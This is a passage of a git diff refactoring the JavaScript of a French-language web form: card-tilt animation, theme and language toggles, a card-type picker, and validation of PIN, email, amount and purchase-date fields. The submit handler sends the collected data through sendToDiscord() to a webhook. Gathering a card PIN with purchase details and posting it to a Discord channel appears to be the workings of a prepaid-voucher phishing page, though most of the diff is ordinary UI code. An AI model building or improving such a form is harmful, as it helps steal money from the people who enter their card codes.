-                const scale = card.classList.contains('selected') ? 1.06 : 1.03;
-                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale(${scale})`;
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                const cx = rect.width / 2, cy = rect.height / 2;
+                const rx = Math.max(-7, Math.min(7, (y - cy) / 12));
+                const ry = Math.max(-7, Math.min(7, (cx - x) / 12));
+                const s = card.classList.contains('selected') ? 1.06 : 1.03;
+                card.style.transform = `perspective(1000px) rotateX(${rx}deg) rotateY(${ry}deg) scale(${s})`;
             });
         };
-
-        const resetMove = () => {
-            if (rafId) cancelAnimationFrame(rafId);
-            card.style.transform = card.classList.contains('selected')
-                ? 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1.04)'
-                : 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1)';
+        const reset = () => {
+            if (raf) cancelAnimationFrame(raf);
+            card.style.transform = card.classList.contains('selected') ? 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1.04)' : 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1)';
         };
-
-        card.addEventListener('mousemove', handleMove);
-        card.addEventListener('mouseleave', resetMove);
-        card.addEventListener('blur', resetMove);
-        card.addEventListener('focus', resetMove);
+        card.addEventListener('mousemove', move);
+        card.addEventListener('mouseleave', reset);
+        card.addEventListener('blur', reset);
+        card.addEventListener('focus', reset);
     });
 }
 
 // ===== GESTION DES ÉVÉNEMENTS =====
-function handleGlobalKeydown(event) {
-    if (event.key === 'Escape') {
-        if (!elements.successModal.classList.contains('hidden')) {
-            closeSuccessModal();
-        }
-        if (elements.cardSelectorSheet.classList.contains('open')) {
-            closeCardSheet();
-        }
+function handleGlobalKeydown(e) {
+    if (e.key === 'Escape') {
+        if (!elements.successModal.classList.contains('hidden')) closeSuccessModal();
+        if (elements.cardSelectorSheet.classList.contains('open')) closeCardSheet();
     }
 }
 
 function bindEvents() {
-    elements.langButtons.forEach(btn => {
-        btn.addEventListener('click', () => setLanguage(btn.dataset.lang));
-    });
+    elements.langButtons.forEach(btn => btn.addEventListener('click', () => setLanguage(btn.dataset.lang)));
+    elements.themeToggle.addEventListener('click', () => applyTheme(currentTheme === 'dark' ? 'light' : 'dark'));
 
-    elements.themeToggle.addEventListener('click', () => {
-        applyTheme(currentTheme === 'dark' ? 'light' : 'dark');
-    });
-
-    // Sélection des cartes - améliorée pour mobile
+    // Sélection des cartes avec stopPropagation
     elements.cardOptions.forEach(option => {
-        option.addEventListener('click', (event) => {
-            event.stopPropagation(); // Empêcher la propagation
-            const cardValue = option.dataset.value;
-            selectCard(cardValue, 'ui');
+        option.addEventListener('click', (e) => {
+            e.stopPropagation();
+            selectCard(option.dataset.value);
         });
-        
-        option.addEventListener('keydown', (event) => {
-            if (event.key === 'Enter' || event.key === ' ') {
-                event.preventDefault();
-                event.stopPropagation();
-                const cardValue = option.dataset.value;
-                selectCard(cardValue, 'ui');
+        option.addEventListener('keydown', e => {
+            if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                selectCard(option.dataset.value);
             }
         });
     });
 
-    // Bouton d'ouverture du sheet
-    elements.cardMobileTrigger.addEventListener('click', (event) => {
-        event.stopPropagation();
-        if (elements.cardSelectorSheet.classList.contains('open')) {
-            closeCardSheet();
-        } else {
-            openCardSheet();
-        }
-    });
-
-    // Fermeture du sheet
-    elements.sheetClose.addEventListener('click', (event) => {
-        event.stopPropagation();
-        closeCardSheet();
-    });
-
-    // Clic sur l'overlay pour fermer
-    elements.sheetOverlay.addEventListener('click', (event) => {
-        event.stopPropagation();
-        closeCardSheet();
-    });
-
-    // Fermeture de la modal
+    elements.cardMobileTrigger.addEventListener('click', openCardSheet);
+    elements.sheetClose.addEventListener('click', closeCardSheet);
+    elements.sheetOverlay.addEventListener('click', closeCardSheet);
     elements.closeSuccessModal.addEventListener('click', closeSuccessModal);
     elements.successModal.querySelector('[data-close-modal]').addEventListener('click', closeSuccessModal);
 
-    // Validation en temps réel
     elements.pinInput.addEventListener('input', () => validatePin(false));
     elements.pinInput.addEventListener('blur', () => validatePin(Boolean(elements.pinInput.value)));
     elements.emailInput.addEventListener('input', () => validateEmail(false));
@@ -994,15 +681,10 @@ function bindEvents() {
     elements.amountInput.addEventListener('blur', () => validateAmount(true));
     elements.purchaseDateInput.addEventListener('blur', () => validateDate(true));
 
-    // Soumission du formulaire
-    elements.form.addEventListener('submit', async event => {
-        event.preventDefault();
+    elements.form.addEventListener('submit', async e => {
+        e.preventDefault();
         clearInlineResult();
-
-        if (!validateForm()) {
-            return;
-        }
-
+        if (!validateForm()) return;
         elements.submitBtn.disabled = true;
         elements.btnText.classList.add('hidden');
         elements.btnLoader.classList.remove('hidden');
@@ -1020,11 +702,7 @@ function bindEvents() {
 
         try {
             const success = await sendToDiscord(formData);
-
-            if (!success) {
-                throw new Error('Webhook request failed');
-            }
-
+            if (!success) throw new Error('Webhook request failed');
             resetFormState();
             openSuccessModal();
         } catch (error) {
@@ -1037,25 +715,30 @@ function bindEvents() {
         }
     });
 
-    // Gestion des touches globales
     document.addEventListener('keydown', handleGlobalKeydown);
-
-    // Changement de viewport
-    isTouchViewport.addEventListener?.('change', event => {
-        if (!event.matches) {
-            closeCardSheet();
-        }
-    });
-
+    isTouchViewport.addEventListener?.('change', event => { if (!event.matches) closeCardSheet(); });
     prefersReducedMotion.addEventListener?.('change', () => {
-        if (prefersReducedMotion.matches) {
-            elements.confettiLayer.innerHTML = '';
-        }
+        if (prefersReducedMotion.matches) elements.confettiLayer.innerHTML = '';
     });
 }
 
 // ===== INITIALISATION =====
-// Démarrer l'application une fois le DOM chargé
+function init() {
+    if (isInitialized) return;
+    isInitialized = true;
+    const savedLang = localStorage.getItem(STORAGE_KEYS.language) || 'fr';
+    const savedTheme = localStorage.getItem(STORAGE_KEYS.theme) || 'light';
+    setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
+    setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
+    applyTheme(savedTheme);
+    setLanguage(savedLang);
+    bindEvents();
+    initTilt();
+    initParticles();
+    initLazyLoading();
+    document.body.classList.add('loaded');
+}
+
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
 } else {
